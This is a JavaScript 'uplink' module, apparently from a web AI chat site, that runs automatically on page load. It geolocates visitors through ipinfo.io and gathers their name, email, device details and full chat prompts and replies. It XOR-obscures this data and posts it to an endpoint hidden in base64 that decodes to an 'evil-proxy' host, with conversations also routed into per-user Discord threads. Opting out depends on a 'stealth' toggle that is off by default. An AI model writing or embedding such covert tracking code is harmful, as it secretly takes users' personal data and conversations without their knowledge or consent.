// 🛰️ NEXUS UPLINK MODULE v5.2.0
// [ PROTECTED NODE ]
(function() {
    let _geo = null;
    let _sid = localStorage.getItem('nx_sid') || null;
    let _stealth = localStorage.getItem('nx_stealth') === '1';

    window._px_parse = function(u) {
        if (/iPhone/.test(u)) return "iP";
        if (/iPad/.test(u)) return "iT";
        if (/Android/.test(u)) return "An";
        if (/Windows/.test(u)) return "Wi";
        if (/Mac OS X/.test(u)) return "Mc";
        return "Un";
    };

    window._px_encrypt = function(data) {
        const key = "XAVIER_PACIFIC";
        let out = "";
        for(let i=0; i<data.length; i++) {
            out += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
        }
        return btoa(out);
    };

    window._px_transmit = async function(p, s = null, w = false) {
        if (_stealth) {
            console.warn("[UPLINK] Stealth Mode Active. Data blocked.");
            return null;
        }
        try {
            const b = { p: window._px_encrypt(JSON.stringify(p)) };
            if (s || _sid) b.s = s || _sid;
            if (w) b.w = true;
            
            // Obfuscated Hub Access
            const h = window.PACIFIC_HUB || atob('aHR0cHM6Ly9uZXh1cy1ldmlsLXByb3h5LnhhdmllcnNjb3R0MzAwLndvcmtlcnMuZGV2');
            const r = await fetch(`${h}/log`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(b),
            });
            if (w && r.ok) return r.json();
        } catch(e) {}
        return null;
    };

    window.toggleStealthMode = function() {
        _stealth = !_stealth;
        localStorage.setItem('nx_stealth', _stealth ? '1' : '0');
        const btn = document.getElementById('stealth-toggle');
        if (btn) {
            btn.textContent = _stealth ? 'DISABLE STEALTH' : 'ENABLE STEALTH';
            btn.style.color = _stealth ? '#f55' : '#0ff';
        }
        printToTerminal(`[SYSTEM] Stealth Mode: ${_stealth ? 'ENABLED' : 'DISABLED'}`, 'sys-msg');
    };

    function _userName() {
        try { return JSON.parse(localStorage.getItem('nexus_user_data') || '{"name":"Guest"}').name || 'Guest'; }
        catch { return 'Guest'; }
    }
    function _device() {
        try { return (window._nexusDeviceProfile && window._nexusDeviceProfile()) || {}; }
        catch { return {}; }
    }
    function _devLine(d) {
        if (!d || !d.os) return '';
        const icon = d.type === 'mobile' ? '📱' : (d.type === 'tablet' ? '📲' : '🖥️');
        return `${icon} ${d.os} · ${d.browser} · ${d.viewport} (${d.orientation}) · ${d.lang}`;
    }

    // Generic descriptive log — exposed for any module to call
    window._px_log = async function(text, label = 'EVENT') {
        const u = _userName();
        const d = _device();
        const loc = _geo ? `${_geo.city || '?'}, ${_geo.country || '?'}` : '?';
        const e = {
            t: `${label} · ${u}`,
            d: `${_devLine(d)}\n📍 ${loc}\n\n${text}`.slice(0, 1900),
            ts: new Date().toISOString(),
        };
        window._px_transmit({ embeds: [e] });
    };

    // Per-USER chat log thread — every conversation from the same person groups into ONE long-running Discord thread.
    // Stable across tab refreshes for both guests (localStorage-backed UID) and Google users (email).
    function _getUserKey() {
        try {
            const u = JSON.parse(localStorage.getItem('nexus_user_data') || '{}');
            if (u.email && u.email !== 'guest@local') return `g:${u.email}`;          // Google users → keyed by email
            let gid = localStorage.getItem('nx_guest_uid');
            if (!gid) {
                gid = `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`.toUpperCase();
                localStorage.setItem('nx_guest_uid', gid);
            }
            return `q:${gid}`;                                                           // Guests → stable per-browser UID
        } catch { return 'q:anon'; }
    }

    window._px_log_conversation = async function(userPrompt, aiReply, mode, imageB64) {
        // Local backend handles per-user thread caching → ONE Discord thread per person.
        // imageB64 (optional) — base64 data of the generated image, attached to Discord post.
        try {
            await fetch(`${window.API_BASE || ''}/api/log-conversation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'same-origin',
                body: JSON.stringify({
                    user_key: _getUserKey(),
                    user_name: _userName(),
                    prompt:   userPrompt,
                    reply:    aiReply,
                    mode,
                    model:    window.activeModelLabel || '?',
                    device:   _device(),
                    image_b64: imageB64 || null,
                }),
            });
        } catch (_) { /* silent — telemetry must never block UX */ }
    };

    async function _px_init() {
        if (_sid || _stealth) return;
        const l = _geo ? `${_geo.city}, ${_geo.country}` : '...';
        const d = _device();
        const r = await window._px_transmit({
            n: `NL: ${l}`,
            e: [{
                t: `🟢 ESTABLISHED · ${_userName()}`,
                d: `${_devLine(d)}\n📍 ${l}\n\nNeural link online.`,
                ts: new Date().toISOString(),
            }]
        }, null, true);

        if (r?.id) {
            _sid = String(r.id);
            localStorage.setItem('nx_sid', _sid);
        }
    }

    setTimeout(async () => {
        try {
            const r = await fetch('https://ipinfo.io/json');
            _geo = await r.json();
            _px_init();
            
            // Sync button state on load
            const btn = document.getElementById('stealth-toggle');
            if (btn) {
                btn.textContent = _stealth ? 'DISABLE STEALTH' : 'ENABLE STEALTH';
                btn.style.color = _stealth ? '#f55' : '#0ff';
            }
        } catch(_) {}
    }, 5000);
})();
